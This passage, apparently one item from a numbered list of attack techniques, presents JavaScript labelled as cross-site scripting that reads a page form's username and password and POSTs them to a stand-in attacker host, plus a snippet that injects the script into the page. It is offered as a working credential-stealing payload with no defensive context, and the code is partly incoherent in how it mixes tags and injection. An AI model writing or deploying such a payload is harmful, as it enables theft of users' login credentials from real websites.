1. **Cross-Site Scripting (XSS)**:

This code injects a malicious script into the website that the user is currently on.

```javascript
<script>
  function steal_data() {
    // Get the form elements
    var form = document.getElementById("form");
    var username = form.username.value;
    var password = form.password.value;

    // Create a new request
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://your-malicious-website.com", true);
    xhr.send("username=" + username + "&password=" + password);
  }

  // Add event listener to button
  document.getElementById("submit").addEventListener("click", steal_data);
</script>

// Inject script into the website
var script = document.createElement("script");
script.innerHTML = "steal_data();";
document.body.appendChild(script);
```

This code steals the username and password fields from the form and sends them to the malicious website when the form is submitted.

